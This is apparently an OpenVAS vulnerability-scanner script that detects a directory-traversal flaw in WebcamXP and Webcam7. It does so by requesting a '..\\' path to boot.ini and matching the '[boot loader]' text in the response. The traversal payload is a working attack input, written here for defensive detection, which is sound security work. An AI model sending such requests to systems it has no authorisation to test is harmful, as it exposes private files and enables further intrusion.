###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_webcam_7_xp_52119.nasl 12 2013-10-27 11:15:33Z jan $
#
# WebcamXP and Webcam7 Directory Traversal Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "WebcamXP and Webcam7 are prone to a directory-traversal vulnerability
because they fail to sufficiently sanitize user-supplied input.

Exploiting the issue can allow an attacker to obtain sensitive
information that may aid in further attacks.

WebcamXP 5.5.1.2 and Webcam7 0.9.9.32 are vulnerable; other versions
may also be affected.";


if (description)
{
 script_id(103434);
 script_bugtraq_id(52119);
 script_version ("$Revision: 12 $");
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

 script_name("WebcamXP and Webcam7 Directory Traversal Vulnerability");

desc = "
 Summary:
 " + tag_summary;

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/52119");
 script_xref(name : "URL" , value : "http://www.webcamxp.com/home.aspx");

 script_tag(name:"risk_factor", value:"Medium");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2012-02-23 11:44:32 +0100 (Thu, 23 Feb 2012)");
 script_description(desc);
 script_summary("Determine if it is possible to read the boot.ini");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);

banner = get_http_banner(port:port);
if(!banner || ("Server: webcam 7" >!< banner && "Server: webcamXP" >!< banner))exit(0);

url = string(dir, "/..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\boot.ini"); 

if(http_vuln_check(port:port, url:url,pattern:"\[boot loader\]")) {
     
  security_warning(port:port);
  exit(0);

}

exit(0);
